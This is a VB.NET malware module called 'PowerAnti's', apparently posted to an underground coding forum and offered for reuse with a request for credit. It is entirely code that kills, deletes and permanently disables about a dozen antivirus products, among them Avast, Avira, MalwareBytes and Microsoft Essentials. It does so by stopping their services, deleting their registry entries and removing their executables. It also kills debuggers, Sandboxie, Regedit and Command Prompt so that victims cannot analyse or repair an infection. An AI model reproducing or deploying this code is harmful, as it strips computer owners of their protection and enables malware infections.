PowerAnti's
'AntiModule Created By Risk
'Undergroundcoding.net
'Fully Working Anti's Count : 13
'Version 1.0.0
'Please Give Me Credits

'If You Have Created You'r Own Anti Using These Function PM Risk On Undergroundcoding.net
'And It Will Be Tested Then Added With You Being Credited

'Module Bugs
'------------
'Sometimes failes to delete files

'Anti's Fixing List (Some useable but buggy)
'----------------
'Avast5 - Useable - Disabled services just can't delete files
'AVG - Not Started
'Avira - Useable - Reboot then delete avgnt. When virus found computer beeps.
'Vba32 - Useable - Requires reboot to stop.
'Trend Micro - Not Useable - Cannot end service and process causes your program to hang


'Anti's Fully Working List
'--------------------------
'ollydb
'Hexworkshop
'MalwareBytes
'A-Squared
'HxD
'ComboFix
'ClamAV
'Sandboxie
'PCTools AV
'Microsoft Essentials
'Regedit
'Command Prompt
'BullGuard


'Subs Explained
'Delete File = This will find the running processes file then delete it for good
'Complete Disable = This will stop it from booting up when the computer is restarted. Needs a reinstall

'Use at you own risk as this corrupts the AV

Imports System.IO
Imports System.ServiceProcess
Imports Microsoft.Win32
Imports System.Threading.Thread
Friend Module Antis
    Dim Serv As New ServiceController
    Dim FilePath As String
    Dim ProcPath As String
    Dim ProcPath2 As String

    'Tools to help remove and disable the services and files

    Private Function SearchForPath(ByVal FileName As String, ByVal SearchPath As String) 'Don't call these the subs call these
        On Error Resume Next
        For Each Files In Directory.GetFiles(SearchPath, "*.exe", SearchOption.AllDirectories)
            If Files.Contains(FileName) Then
                Return Files
                Exit For
            End If
        Next
        Return Nothing
    End Function

    Private Function GetProcessPath(ByVal ProcessName As String) 'Don't call these the subs call these
        Dim p As New Process()
        For Each p In Process.GetProcessesByName(ProcessName)
            Try
                Dim PP As ProcessModule
                For Each PP In p.Modules
                    Return PP.FileName.ToString()
                Next
            Catch
            End Try
        Next
        Return Nothing
    End Function

    Private Function ForceRemoveService(ByVal ServiceName As String) 'Don't call these the subs call these
        On Error Resume Next
        Microsoft.Win32.Registry.LocalMachine.DeleteSubKeyTree("SYSTEM\CurrentControlSet\Services\" & ServiceName)
        Dim regKey As RegistryKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\" & ServiceName, False)
        Dim StartStat As String = regKey.GetValue("Start")
        'Check if key was removed so the service will not boot on restart and will be removed from services
        If StartStat = "" Then
            Return True
        Else
            Return False
        End If
    End Function

    Private Function RemoveFromStartUp(ByVal AppName As String) 'Don't call these the subs call these
        On Error Resume Next
        Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(AppName)
        Dim regKey As RegistryKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        Dim StartStat As String = regKey.GetValue(AppName)
        'Check if key was removed so the program will not boot on restart
        If StartStat = "" Then
            Return True
        Else
            Return False
        End If
    End Function

    Private Function KillProcess(ByVal ProcessName As String) 'Don't call these the subs call these
        On Error Resume Next
        Dim KillProc() As Process = System.Diagnostics.Process.GetProcessesByName(ProcessName)
        For Each p As Process In KillProc
            p.Kill()
        Next
        Return True
    End Function

    Private Function KillService(ByVal ServiceName As String) 'Don't call these the subs call these
        On Error Resume Next
        Serv.ServiceName = ServiceName
        If Serv.Status = ServiceControllerStatus.Stopped Then
        Else
            'Stop Service
            Serv.Stop()
            'Check if service stopped
            If Serv.Status = ServiceControllerStatus.Stopped Then
                Return True
            Else
                Return False
            End If
        End If
        Return Nothing
    End Function

    Private Function RemoveFromBootUp(ByVal ServiceName As String) 'Don't call these the subs call these
        On Error Resume Next
        Microsoft.Win32.Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\" & ServiceName, True).SetValue("Start", "4", Microsoft.Win32.RegistryValueKind.DWord)
        Dim regKey As RegistryKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\" & ServiceName, False)
        Dim StartStat As String = regKey.GetValue("Start")
        If StartStat = "4" Then
            'Disabled For Next Reboot's
            Return True
        Else
            'Failed To Disable
            Return False
        End If
    End Function

    Private Sub DeleteFiles(ByVal Path As String) 'Don't call these the subs call these
        On Error Resume Next
        If Path = "" Then
        Else
            'Checking file exists
            If My.Computer.FileSystem.FileExists(Path) = True Then
                'If exists deletes the file
                My.Computer.FileSystem.DeleteFile(Path)
            End If
        End If

    End Sub



    'This is were the Anti's Begin


    Friend Sub AntiAvast(ByVal DeleteFile As Boolean, ByVal CompleteDisable As Boolean) 'Half Way Disables in services but cannot delete
        On Error Resume Next
        'Getting the process path
        FilePath = GetProcessPath("AvastSvc")
        'Stops Service
        KillService("avast! Antivirus")
        'Deletes
        If DeleteFile = True Then
            DeleteFiles(FilePath)
        End If
        'Stops restarting when system reboots
        If CompleteDisable = True Then
            RemoveFromBootUp("avast! Antivirus")
        End If
    End Sub


    Friend Sub AntiAVG(ByVal DeleteFile As Boolean, ByVal CompleteDisable As Boolean) 'Can't install on my PC
        On Error Resume Next
        'Stops Service
        KillService("")
        'Deletes
        If DeleteFile = True Then
            FilePath = SearchForPath("", "C:\Program Files\")
            DeleteFiles(FilePath)
        End If
        'Stops restarting when system reboots
        If CompleteDisable = True Then
            RemoveFromBootUp("")
        End If
    End Sub


    Friend Sub AntiSandboxie(ByVal DeleteFile As Boolean, ByVal CompleteDisable As Boolean) 'Complete
        On Error Resume Next
        'Get Process Path
        FilePath = GetProcessPath("SbieSvc")
        'Stops Service
        KillService("SbieSvc")
        'Deletes
        If DeleteFile = True Then
            DeleteFiles(FilePath)
        End If
        'Stops restarting when system reboots
        If CompleteDisable = True Then
            RemoveFromBootUp("SbieSvc")
        End If
    End Sub


    Friend Sub AntiASquared(ByVal DeleteFile As Boolean, ByVal CompleteDisable As Boolean) 'Complete
        On Error Resume Next
        'Stops Service
        KillService("a2free")
        'Kill second process otherwise a2free service is restarted
        KillProcess("a2free")
        'Deletes
        If DeleteFile = True Then
            FilePath = SearchForPath("a2service.exe", "C:\Program Files\")
            DeleteFiles(FilePath)
            FilePath = SearchForPath("a2free.exe", "C:\Program Files\")
            DeleteFiles(FilePath)
        End If
        'Stops restarting when system reboots
        If CompleteDisable = True Then
            RemoveFromBootUp("a2free")
        End If
    End Sub

    Friend Sub AntiAvira(ByVal DeleteFile As Boolean, ByVal CompleteDisable As Boolean) 'Half way
        On Error Resume Next
        'Problems
        '--------
        'AntiVirService - Service - System - can't disable
        'AntiVirSchedulerService - Service - System - can't disable
        'avipbb - Service - System - can't disable

        'Remove the service completely
        ForceRemoveService("AntiVirService")
        ForceRemoveService("avgio")
        'Stop the services
        KillService("AntiVirSchedulerService")
        KillService("avgntflt")
        KillService("avipbb")
        KillProcess("avgnt.exe")
        'Deletes
        If DeleteFile = True Then
            FilePath = SearchForPath("avgnt.exe", "C:\Program Files\")
            DeleteFiles(FilePath)
            FilePath = SearchForPath("avgaurd.exe", "C:\Program Files\")
            DeleteFiles(FilePath)
        End If
        'Stops restarting when system reboots
        If CompleteDisable = True Then
            RemoveFromBootUp("AntiVirService")
            RemoveFromBootUp("AntiVirSchedulerService")
            RemoveFromBootUp("avgio")
            RemoveFromBootUp("avgntflt")
            RemoveFromBootUp("avipbb")
            RemoveFromStartUp("avgnt")
        End If
        'Restarting after removing avgnt from registry only stops that basically so FAIL
        'After reboot i delete avgnt.exe and now it cannot scan and when a virus is detected my computer beeps
    End Sub

    Friend Sub AntiHexWorkShop(ByVal DeleteFile As Boolean) ' Done
        On Error Resume Next
        'Get Process Path Then Kill Process
        FilePath = GetProcessPath("HWorks32")
        KillProcess("HWorks32")
        If DeleteFile = True Then
            'Delete file if found
            DeleteFiles(FilePath)
        End If
      
    End Sub

    Friend Sub AntiHxD(ByVal DeleteFile As Boolean) ' Done
        On Error Resume Next
        'Get Process Path Then Kill Process
        FilePath = GetProcessPath("HxD")
        KillProcess("HxD")
        If DeleteFile = True Then
            'Delte file if found
            DeleteFiles(FilePath)
        End If
    End Sub

    Friend Sub AntiOllyDB(ByVal DeleteFile As Boolean) ' Done
        On Error Resume Next
        'Get Process Path Then Kill Process
        FilePath = GetProcessPath("ollydbg")
        KillProcess("ollydbg")
        If DeleteFile = True Then
            'Delte file if found
            DeleteFiles(FilePath)
        End If
    End Sub

    Friend Sub AntiComboFix(ByVal DeleteFile As Boolean) ' Done
        On Error Resume Next
        'Get Process Path Then Kill Process
        FilePath = GetProcessPath("ComboFix")
        KillProcess("ComboFix")
        If DeleteFile = True Then
            'Delte file if found
            DeleteFiles(FilePath)
        End If
    End Sub

    Friend Sub AntiClamAV(ByVal DeleteFile As Boolean, ByVal CompleteDisable As Boolean) 'Complete
        On Error Resume Next
        FilePath = GetProcessPath("agent")
        ProcPath = GetProcessPath("iptray")
        'Stops Service so the iptray process can be terminayed
        KillService("ImmunetProtect")
        'Can now be terminated as main service is disabled
        KillProcess("iptray")
        RemoveFromStartUp("ImmunetProtect")
        'Deletes
        If DeleteFile = True Then
            DeleteFiles(FilePath)
            DeleteFiles(ProcPath)
            'Stops restarting when system reboots
        End If
        If CompleteDisable = True Then
            RemoveFromBootUp("ImmunetProtect")
        End If
    End Sub


    Friend Sub AntiESTNOD32(ByVal DeleteFile As Boolean) 'Disables GUI Can't Yet Disable Service
        On Error Resume Next
        'Need to disable ekrn service
        FilePath = GetProcessPath("egui")
        'Kill process
        KillProcess("egui")
        'Remove from startup
        RemoveFromStartUp("egui")
        'Deletes
        If DeleteFile = True Then
            DeleteFiles(FilePath)
        End If
    End Sub

    Friend Sub AntiMalwareBytes(ByVal DeleteFile As Boolean) 'Done
        On Error Resume Next
        FilePath = GetProcessPath("mbam")
        'Kill process
        KillProcess("mbam")
        'Deletes
        If DeleteFile = True Then
            DeleteFiles(FilePath)
        End If
    End Sub


    Friend Sub AntiPCToolsAV(ByVal DeleteFile As Boolean, ByVal CompleteDisable As Boolean) 'Done
        On Error Resume Next
        FilePath = GetProcessPath("PCTAVSvc")
        ProcPath = GetProcessPath("PCTAV")
        KillService("PCTAVSvc")
        KillProcess("PCTAV")
        RemoveFromStartUp("PCTAVApp")
        'Deletes
        If DeleteFile = True Then
            DeleteFiles(FilePath)
            DeleteFiles(ProcPath)
            'Stops restarting when system reboots
        End If
        If CompleteDisable = True Then
            RemoveFromBootUp("PCTAVSvc")
        End If
    End Sub

    Friend Sub AntiMicrosoft(ByVal DeleteFile As Boolean) 'Done
        On Error Resume Next
        FilePath = GetProcessPath("msseces")
        KillProcess("msseces")
        RemoveFromStartUp("MSSE")
        'Deletes
        If DeleteFile = True Then
            DeleteFiles(FilePath)
        End If
    End Sub


    Friend Sub AntiVBA32(ByVal DeleteFile As Boolean, ByVal CompleteDisable As Boolean) 'Done but requires reboot to work
        FilePath = GetProcessPath("vba32ldr")
        RemoveFromStartUp("Vba32Loader")
        'Deletes
        If DeleteFile = True Then
            DeleteFiles(FilePath)
        End If
        'Disable service booting up on restart
        If CompleteDisable = True Then
            RemoveFromStartUp("Vba32Loader")
        End If
    End Sub

    Friend Sub AntiRegedit(ByVal DeleteFile As Boolean) 'Done
        On Error Resume Next
        FilePath = GetProcessPath("regedit")
        KillProcess("regedit")
        'Deletes
        If DeleteFile = True Then
            DeleteFiles(FilePath)
        End If
    End Sub


    Friend Sub AntiCommandPrompt(ByVal DeleteFile As Boolean) 'Done
        On Error Resume Next
        FilePath = GetProcessPath("cmd")
        KillProcess("cmd")
        'Deletes
        If DeleteFile = True Then
            DeleteFiles(FilePath)
        End If
    End Sub


    Friend Sub AntiBullGuard(ByVal DeleteFile As Boolean, ByVal CompleteDisable As Boolean) 'Done
        'Works but process doesn't stop completly till after reboot. Still works tho.
        On Error Resume Next
        FilePath = GetProcessPath("BullGuard")
        KillProcess("BullGuard")
        KillService("BsMain")
        'Deletes
        If DeleteFile = True Then
            DeleteFiles(FilePath)
            'Stops restarting when system reboots
        End If
        If CompleteDisable = True Then
            RemoveFromBootUp("BsMain")
            RemoveFromStartUp("BullGuard")
        End If
    End Sub


    Friend Sub AntiTrendMicro(ByVal DeleteFile As Boolean, ByVal CompleteDisable As Boolean) 'Do not use will cause program to hang
        'Works but process doesn't stop completly till after reboot. Still works tho.
        On Error Resume Next
        'Flagged and then stopped by Trend
        FilePath = GetProcessPath("UfSeAgnt")
        ProcPath = GetProcessPath("TmPfw")
        KillProcess("UfSeAgnt")
        KillProcess("UfSeAgnt")
        KillProcess("TmPfw")
        KillService("TmPfw")
        KillService("SfCtlCom")

        'Fail to delete as process cannot be terminated
        If DeleteFile = True Then
            DeleteFiles(FilePath)
            DeleteFiles(ProcPath)
            'Stops restarting when system reboots
        End If
        If CompleteDisable = True Then
            RemoveFromBootUp("SfCtlCom")
            'Removing from registry works
            RemoveFromStartUp("UfSeAgnt.exe")
        End If
    End Sub
End Module
